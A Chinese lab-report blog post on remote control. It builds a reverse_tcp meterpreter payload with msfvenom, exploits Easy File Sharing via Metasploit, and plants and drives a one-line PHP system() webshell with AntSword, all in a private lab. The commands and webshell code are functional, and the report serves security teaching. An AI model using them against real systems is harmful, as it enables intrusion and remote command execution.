---
title: 远程控制与 Webshell-反弹木马与一句话木马
date: 2026-11-12 23:10:00
categories:
  - 网络渗透
tags:
  - 远程控制
  - Metasploit
  - msfvenom
  - Meterpreter
  - Webshell
  - 蚁剑
  - 一句话木马
---

两项作业其实是同一个问题的两种答案：如何让一台机器听你的话。实验一从系统层面进去——生成一个反向连接的可执行文件，借漏洞把它投递到 Windows 上运行，拿回 meterpreter 会话；实验二从 Web 层面进去——往站点目录放一行 PHP，用蚁剑把这个「命令入口」接管过来。前者的权限来自被利用的服务，后者的权限来自 Web 账号，两者都拿不到最高权限，这一步恰恰是理解远程控制边界的关键。

<!-- more -->

## 一、实验目的与环境

### 1.1　实验目的

- 理解远程控制中正向连接与反向连接的区别，明确反向连接为何能穿透 NAT 与防火墙。
- 掌握使用 `msfvenom` 生成被控端、使用 `msfconsole` 获取 meterpreter 会话的完整流程。
- 掌握一句话木马的原理，使用蚁剑连接 Webshell 并控制目标网站。

### 1.2　实验环境

*表 1　实验环境与角色分工*

| 角色 | 操作系统 | 地址 | 关键服务 / 说明 |
| --- | --- | --- | --- |
| 攻击机 | Kali Linux 2026.2 | 192.168.64.4 | msfconsole、蚁剑 |
| 被控端 | Windows 7 SP1 x64 | 192.168.64.100 | Easy File Sharing 7.2（8000 端口） |
| Web 靶机 | Kali Linux（6.19.14+kali-amd64） | 虚拟机 80，宿主 18080 | Apache 2.4.69 + mod_php |

## 二、实验一：生成被控端与远程控制

### 2.1　生成被控端载荷

在 Kali 中使用 `msfvenom` 生成 Windows 平台的反向连接载荷，三个核心参数分别是 `-p`（指定 payload）、`-f`（指定输出格式）、`-o`（指定保存路径）：

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.64.4 LPORT=4444 -f exe -o /root/payload.exe
```

其中 `windows/meterpreter/reverse_tcp` 表示由被控端主动回连攻击机，是能够穿透 NAT 的连接方式。

### 2.2　启动主控端并获取会话

使用 Easy File Sharing 7.2 的 SEH 漏洞投递载荷，模块中的 LHOST/LPORT 与载荷保持一致：

```bash
msfconsole
use exploit/windows/http/easyfilesharing_seh
set LHOST 192.168.64.4
set LPORT 4444
run
```

{% asset_img fig1-session.png %}

*图 1　meterpreter 会话建立，sysinfo 返回 Windows 7 SP1，getuid 返回 SHU278-PC\shu278*

会话于 2026-11-09 09:22:42 建立，反弹链路为 `192.168.64.4:4444 → 192.168.64.100:49164`。`sysinfo` 显示目标为 Windows 7 (6.1 Build 7601) SP1 x64、域为 WORKGROUP；`getuid` 返回 `SHU278-PC\shu278`，说明当前权限为该主机普通用户而非 SYSTEM；`pwd` 位于 `C:\Users\shu278\Desktop`，即载荷落地位置。对目标的控制已完全建立。

### 2.3　提交微步云沙箱检测

将生成的 `payload.exe` 上传至微步在线云沙箱（https://s.threatbook.com/），查看其动态行为：

{% asset_img fig2-sandbox.png %}

*图 2　微步云沙箱动态分析：样本启动后向内网地址发起 TCP 连接*

沙箱动态分析显示，样本在被拉起后 25ms 内即发起 TCP 连接，共记录 TCP 流量 6 条，目标地址均为 `192.168.64.4:5000`，Dead-Hosts 为 1，最终判定结果为「安全 / 白名单」。

该判定需要说明：192.168.64.4 属内网保留地址，沙箱运行于公网环境无法访问该主机，因此样本只表现出「向外发起连接」这一动作，没有后续的下载、加密或外联行为，故未被判为恶意。但从 25ms 内的连续连接请求可以看出，样本内置的 reverse_tcp 反向连接逻辑已被正确触发，沙箱的流量记录本身就是载荷功能正常的证据。

### 2.4　关于两处端口不一致的说明

需注意：提交沙箱的样本使用 `LPORT=5000` 生成，而实际攻击复现使用 `LPORT=4444` 的载荷，两者是两次独立生成的载荷。沙箱流量中的 5000 端口对应前者，meterpreter 会话中的 4444 端口对应后者，不可混为一谈。

## 三、实验二：一句话木马与蚁剑控制网站

### 3.1　目标 Web 环境识别

先用响应头确认目标站点的服务类型：

```bash
curl -sI http://127.0.0.1/ | grep -i '^server'
```

{% asset_img fig3-server-header.png %}

*图 3　响应头显示目标 80 端口运行 Apache 2.4.69 (Debian)*

机器上同时安装了 nginx，但其未占用 80 端口，且 `/etc/nginx/sites-enabled/default` 中 `location ~ \.php$` 段落整段处于注释状态，因此不参与请求处理；PHP 实际以 mod_php 模块方式由 Apache 进程内嵌解析，故 `.php` 文件无需执行位即可运行。

### 3.2　写入一句话木马

一句话木马的内容如下，保存为 `shell.php`，文件大小为 35 字节：

```php
<?php system($_REQUEST['cmd']);?>
```

其中 `system()` 用于执行系统命令并输出结果，`$_REQUEST['cmd']` 接收客户端提交的参数 cmd，因此访问 `shell.php?cmd=命令` 即可在服务器上执行任意命令。

{% asset_img fig4-shell-files.png %}

*图 4　shell.php 与 shell_eval.php 已写入站点根目录 /var/www/html*

目录与文件的属主均为 root:root，权限为 755/644，Web 服务账号 www-data 仅具备读取权限，不具备写入权限。

### 3.3　蚁剑连接与控制

在蚁剑中添加目标地址 `http://127.0.0.1:18080/shell.php`，连接密码为 `cmd`，连接成功后打开虚拟终端执行命令：

{% asset_img fig5-antsword.png %}

*图 5　蚁剑虚拟终端回显：id 返回 www-data，pwd 位于 /var/www/html*

`id` 返回 `uid=33(www-data) gid=33(www-data) groups=33(www-data)`；`pwd` 返回 `/var/www/html`；`ls /` 与 `whoami` 亦均有正常回显，说明已取得对目标网站的命令执行权限。

### 3.4　Web 层验证

不使用蚁剑，直接用浏览器访问木马地址，同样返回执行结果，说明木马在 Web 层生效：

{% asset_img fig6-browser.png %}

*图 6　浏览器访问 shell.php?cmd=whoami 返回 www-data*

宿主机通过 VirtualBox NAT 网络端口转发，将宿主 18080 映射至虚拟机 80 端口，故访问地址为 `http://127.0.0.1:18080/shell.php?cmd=whoami`。URL 中问号之后为参数区，格式为「参数名=参数值」，多个参数之间用 `&` 分隔。

## 四、结果分析

实验一与实验二分别对应远程控制的两种典型入口，其权限来源与投递方式差异明显：

*表 2　两种远程控制入口的对比*

| 对比项 | 实验一：漏洞投递载荷 | 实验二：一句话木马 |
| --- | --- | --- |
| 投递方式 | 利用 Easy File Sharing 7.2 SEH 漏洞 | 直接写入站点目录的 PHP 脚本 |
| 连接方向 | 被控端主动回连（反向） | 攻击端主动发起 HTTP 请求（正向） |
| 权限来源 | 被利用服务的运行账号 | Web 服务账号 www-data |
| 持久性 | 进程级，重启即失效 | 文件级，脚本在则权限在 |
| 典型用途 | 获取交互式会话、后渗透 | 权限维持、快速执行命令 |

从权限角度看，两者都未能取得系统最高权限：实验一拿到的是普通用户 shu278，实验二拿到的是 www-data。这符合真实渗透场景的常见情况——远程控制的第一步是获得立足点，而权限提升属于独立的后续阶段。

## 附录 A　实验一命令逐条解释

本附录按作业顺序列出实验一使用的全部命令，每条给出英文原词拆解、命令作用、为什么需要以及预期输出。命令中的 IP 地址与文件路径与正文保持一致。

### A.1　生成被控端：msfvenom

作用是生成一个 Windows 可执行文件，文件在被控端运行后主动回连攻击机的 4444 端口。

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.64.4 LPORT=4444 -f exe -o /root/payload.exe
```

*表 3　msfvenom 及参数逐段解释*

| 片段 | 英文原词与含义 | 在这条命令里的作用 |
| --- | --- | --- |
| msfvenom | Metasploit Framework + venom（毒液，喻指注入的恶意代码） | 载荷生成器，把一段攻击代码包装成可直接运行的程序，不必自己写 C 代码再编译 |
| -p | payload（载荷），指定攻击代码成品 | 决定包装哪一款载荷，是整条命令的核心 |
| windows/meterpreter/reverse_tcp | windows 目标平台；meterpreter 内存态后门；reverse_tcp 反向 TCP 连接 | 决定载荷跑在哪、跑什么、怎么回连。reverse 表示由被控端主动回连，因此能穿过 NAT 与入站防火墙 |
| LHOST | Local HOST，本机（攻击机）地址 | 载荷据此知道回连谁；写成 127.0.0.1 或写错地址，会话永远收不到 |
| LPORT | Local PORT，本机监听端口 | 必须与主控端启动 handler 的端口一致，否则 TCP 握手对不上 |
| -f | format（格式） | 指定产物类型，exe 才能在 Windows 上运行；Linux 用 elf，纯数据用 raw |
| exe | Windows 可执行文件后缀 | -f 的取值，决定文件被双击后能被系统加载 |
| -o | output（输出） | 指定保存路径；不写会把二进制直接打到终端，无法使用 |
| /root/payload.exe | root 用户的家目录 | 后续上传被控端与提交沙箱都使用这个文件 |

预期输出：先打印一段版本横幅与 Payload size（数值随版本不同而变化），最后一行是 `Saved as: /root/payload.exe`。判定成功只看这一行；若提示 `The following options are required` 之类，说明 LHOST 或 LPORT 漏填。

### A.2　启动主控端并选择漏洞模块

作用是启动 Metasploit 控制台，选定投递载荷的漏洞模块，并把连接参数填成与载荷完全一致。

```bash
msfconsole
use exploit/windows/http/easyfilesharing_seh
set RHOSTS 192.168.64.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.64.4
set LPORT 4444
run
```

*表 4　msfconsole 及各条指令逐段解释*

| 片段 | 英文原词与含义 | 在这条命令里的作用 |
| --- | --- | --- |
| msfconsole | Metasploit + console（控制台） | 启动 MSF 命令行界面，普通 shell 提示符随之变为 `msf6 >`，此后输入的都是 MSF 内部指令 |
| use | 使用 | 把当前上下文切换到某个模块，之后的 set 只作用于这个模块 |
| exploit/windows/http/easyfilesharing_seh | exploit 漏洞利用模块；windows 目标系统；http 经 HTTP 服务交互；easyfilesharing_seh 目标软件名 + SEH 溢出类型 | 选定投递通道。SEH 指 Windows 的结构化异常处理，缓冲区溢出后用异常处理链劫持执行流 |
| set | 赋值 | 为模块参数填值，填一次即作用于当前模块 |
| RHOSTS | Remote HOSTS，远端主机 | 被攻击的地址，本实验为 Windows 7 的 192.168.64.100 |
| PAYLOAD | 模块得手后在目标上运行的载荷 | 必须与 msfvenom 生成的是同一款，否则 handler 与载荷对不上，连上也会立即断开 |
| LHOST / LPORT | 接收回连的地址与端口 | 必须与载荷内写死的 4444 一致，且本机该端口未被其他程序占用 |
| run | 运行，等同 exploit | 执行整个利用流程：先启动 handler 监听，再向目标发送攻击报文 |

预期输出：提示符变为 `msf6 exploit(windows/http/easyfilesharing_seh) >`；run 之后依次出现 `Started reverse_tcp handler on 192.168.64.4:4444`、`Sending stage` 以及 `Meterpreter session 1 opened (192.168.64.4:4444 -> 192.168.64.100:49164)`。若只有 handler 而没有 session opened，说明报文没打通：目标未运行该软件、端口不对或防火墙拦截。

### A.3　会话建立后的操作

作用是回到已建立的会话，并读取被控端基本信息，用输出证明控制真实存在。

```bash
sessions -i 1
sysinfo
getuid
pwd
```

*表 5　会话操作命令逐段解释*

| 片段 | 英文原词与含义 | 在这条命令里的作用 |
| --- | --- | --- |
| sessions | 会话（session：一段持续连接） | 列出当前所有已建立的会话及其编号，不带参数就是查看有几台上线 |
| -i | interactive（交互式） | 进入指定编号的会话，提示符变为 `meterpreter >` |
| 1 | 会话编号 | 对应列表里的 Id 列，首次拿到的会话一般是 1 |
| sysinfo | system information（系统信息） | 读出计算机名、操作系统版本、架构与工作组，用于确认目标身份 |
| getuid | get user identifier（取用户标识） | 返回当前进程以哪个账号运行；普通用户说明尚未取得系统最高权限 |
| pwd | print working directory（打印当前目录） | 返回被控端当前目录，本实验为 `C:\Users\shu278\Desktop`，即载荷落地位置 |

预期输出：提示符 `meterpreter >`；sysinfo 含 `Computer : SHU278-PC` 与 `OS : Windows 7 SP1 x64`；getuid 返回 `Server username: SHU278-PC\shu278`；pwd 返回 `C:\Users\shu278\Desktop`。

## 附录 B　实验二命令逐条解释

实验二的命令分两处执行：确认服务指纹的命令在 Kali 本机终端运行，其余命令经蚁剑虚拟终端在目标站点上运行。两者结论应当完全一致，这也是判断远程控制通道是否可靠的一项依据。

### B.1　确认 80 端口的服务类型

作用是只取响应头，判断究竟是哪款 Web 服务器在解析 PHP。

```bash
curl -sI http://127.0.0.1/ | grep -i '^server'
```

*表 6　curl / grep 及参数逐段解释*

| 片段 | 英文原词与含义 | 在这条命令里的作用 |
| --- | --- | --- |
| curl | client URL，命令行 HTTP 客户端 | 发出一次 HTTP 请求并打印响应，不需要打开浏览器 |
| -s | silent（静默） | 不显示进度条与握手信息，只保留结果，便于后续筛选 |
| -I | 大写 I，`--head` | 只取响应头，不下载网页正文；Server 字段只出现在头里 |
| http://127.0.0.1/ | 回环地址（loopback），指虚拟机自身 | 在 Kali 内部访问本站点，绕开端口转发，结论才能对应到目标机本身 |
| \| | 管道（pipe） | 把左边命令的输出当作右边命令的输入 |
| grep | global regular expression print | 按模式筛选行，只保留匹配的那一行 |
| -i | ignore case（忽略大小写） | Server 与 server 都能匹配 |
| '^server' | ^ 为行首锚点 | 只匹配以 server 开头的行，避免正文里偶然出现的同名词 |

预期输出：仅一行 `Server: Apache/2.4.69 (Debian)`。该字段由服务端自己写入响应头，不能伪装。若显示 `Server: nginx/…`，则说明是那份 PHP 段被注释的 nginx 在应答。

### B.2　查看目录与文件属性

作用是确认木马是否真的落在站点根目录，以及 Web 进程对该目录有没有写权限。

```bash
ls -la /var/www/html
ls -la /var/www
ls -la /etc/nginx/sites-enabled/
```

*表 7　ls 及参数逐段解释*

| 片段 | 英文原词与含义 | 在这条命令里的作用 |
| --- | --- | --- |
| ls | list（列出） | 列出目录内容 |
| -l | long（长格式） | 每行给出权限、属主、属组、大小与修改时间 |
| -a | all（全部） | 连以 . 开头的隐藏文件一并列出，如 .env、.git |
| /var/www/html | 绝对路径，开头的 / 表示从根目录算起 | 站点根目录（Apache 的 DocumentRoot），木马必须在此才能被 URL 访问到 |
| /var/www | 上一级目录 | 用于判断是否存在其他站点目录或可写目录 |
| /etc/nginx/sites-enabled/ | nginx 已启用站点目录 | 其中 default 是符号链接（首字母 l），正本在 sites-available，改 enabled 里的文件等于改正本 |

预期输出：每个条目一行，形如 `-rw-r--r-- 1 root root 35 Nov 11 05:13 shell.php`。行首 d 为目录、l 为符号链接、- 为普通文件。本实验全部为 root root、权限 755/644，说明 www-data 只能读不能写。

### B.3　确认当前身份与所在位置

作用是在 Web 进程的权限下确认我是谁、我在哪，这是判断立足点价值最直接的证据。

```bash
whoami
id
pwd
```

*表 8　身份确认命令逐段解释*

| 片段 | 英文原词与含义 | 在这条命令里的作用 |
| --- | --- | --- |
| whoami | who am i（我是谁） | 只打印当前用户名，最短的一条身份确认 |
| id | identifier（标识） | 打印 uid、gid 与所属附加组；比 whoami 多出“属于哪些组”，提权判断要看它 |
| pwd | print working directory | 打印当前绝对路径，用于核对界面标题栏显示的路径是否可信 |

预期输出：`www-data`；`uid=33(www-data) gid=33(www-data) groups=33(www-data)`；`/var/www/html`。三个数字都是 33 且只有一个组，属于典型的低权限 Web 服务账号。

### B.4　读取配置文件

作用是读取纯文本配置，找账号、路径、日志位置这类明文线索。

```bash
cat /etc/passwd
cat /etc/nginx/sites-enabled/default
```

*表 9　cat 与目标文件逐段解释*

| 片段 | 英文原词与含义 | 在这条命令里的作用 |
| --- | --- | --- |
| cat | concatenate（连接），把文件内容连续输出 | 看单个文件即打印内容；只读不改，比用编辑器安全 |
| /etc/passwd | 用户账号清单，每行 7 个字段，用 : 分隔 | 第 3 列 UID 为 0 的是 root 级账号；最后一列不是 /usr/sbin/nologin 的才是可登录账号 |
| /etc/nginx/sites-enabled/default | 指向 sites-available/default 的符号链接 | 查看 root 指向哪个目录、PHP 段落是否被 # 注释；# 之后整行不生效 |

预期输出：`/etc/passwd` 打印数十行，首行为 `root:x:0:0:root:/root:/bin/bash`；nginx 配置里 `location ~ \.php$` 段落每行都以 # 开头，说明这份配置不解析 PHP。

### B.5　通过 URL 参数执行命令

一句话木马把 URL 里的参数当作命令执行，因此“命令”写在查询串里。作用是不依赖蚁剑，直接在浏览器验证木马已在 Web 层生效。

```text
http://127.0.0.1:18080/shell.php?cmd=whoami
```

*表 10　URL 各段逐段解释*

| 片段 | 英文原词与含义 | 在这条命令里的作用 |
| --- | --- | --- |
| http:// | 超文本传输协议 | 明文传输；不写端口时默认 80，此处显式写成 18080 |
| 127.0.0.1 | 回环地址，指宿主机自身 | 宿主机上的 18080 由 VBoxNetNAT 转发至虚拟机的 80 |
| 18080 | 端口号 | 与虚拟机 80 不是同一个数：宿主机 18080 → 端口转发 → 虚拟机 80 |
| shell.php | 木马文件名 | 必须位于站点根目录，URL 路径与磁盘路径一一对应 |
| ? | 查询串起点 | 问号之后的内容全部交给脚本处理，不参与文件定位 |
| cmd=whoami | 参数名=参数值 | cmd 对上木马里的 `$_REQUEST['cmd']`，whoami 是被执行的那条命令 |

注意：命令里不能直接出现 `&`，它在 URL 中表示“下一个参数开始”，例如 `?cmd=ls / & echo hi` 会被拆成两个参数；确实需要传 `&` 时必须写成 `%26`。空格由浏览器自动编码为 `%20`，可以直接书写。

预期输出：页面只显示一行 `www-data`。若显示 `sh: 1: xxx: not found`，说明命令名写错或该程序未安装（例如新版 Kali 已移除 ifconfig，改用 `ip a`）。

### B.6　一句话木马语句的逐段解释

这一行不是 shell 命令，而是由服务器执行的 PHP 语句；但它决定“命令从哪里来”，因此必须逐段看懂。

```php
<?php system($_REQUEST['cmd']);?>
```

*表 11　一句话木马语句逐段解释*

| 片段 | 英文原词与含义 | 在这条命令里的作用 |
| --- | --- | --- |
| `<?php … ?>` | PHP 起始与结束标记 | 告诉 Apache 这一小段要交给 PHP 解释器，标记之外的内容原样输出 |
| system() | 系统函数，执行命令并把输出直接打到页面 | 相当于在目标机上开了一个只回显的 shell；同类还有 exec()、shell_exec()、passthru() |
| `$_REQUEST['cmd']` | PHP 预定义变量，合并 GET、POST 与 Cookie 三个来源的入参 | 取值来源宽，所以浏览器 ?cmd= 与蚁剑的 POST 都能驱动同一个木马 |
| ; | 语句结束符 | PHP 每条语句以分号结尾，与 shell 中“顺序执行”的含义不同 |
| 35 字节 | 文件大小 | 正好等于这一行加换行，可用于核对文件未被编辑器改坏 |

提醒：不要从课件里直接复制这句代码。PPT 排版常把半角单引号改成中文弯引号，PHP 会把它当成未定义常量，木马随之失效；键名外必须使用半角单引号或双引号。

## 附录 C　命令与作业步骤对照索引

下表把两项作业的每个步骤对应到具体命令与解释小节，便于按图检索。

*表 12　作业步骤与命令、解释位置对照*

| 作业项 | 步骤 | 命令 | 解释位置 |
| --- | --- | --- | --- |
| 第一项 | 生成被控端 | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=… -f exe -o /root/payload.exe` | A.1 |
| 第一项 | 启动主控端并选择漏洞模块 | `msfconsole` → `use exploit/windows/http/easyfilesharing_seh` → `set` → `run` | A.2 |
| 第一项 | 进入会话验证控制 | `sessions -i 1`、`sysinfo`、`getuid`、`pwd` | A.3 |
| 第一项 | 提交微步云沙箱 | 无命令行操作，浏览器上传 payload.exe | 正文 2.3 |
| 第二项 | 服务指纹识别 | `curl -sI http://127.0.0.1/ \| grep -i '^server'` | B.1 |
| 第二项 | 确认木马与目录权限 | `ls -la /var/www/html` | B.2 |
| 第二项 | 蚁剑虚拟终端控制 | `whoami`、`id`、`pwd`、`cat` | B.3、B.4 |
| 第二项 | 浏览器验证执行 | `http://127.0.0.1:18080/shell.php?cmd=whoami` | B.5 |
| 第二项 | 木马内容说明 | `<?php system($_REQUEST['cmd']);?>` | B.6 |
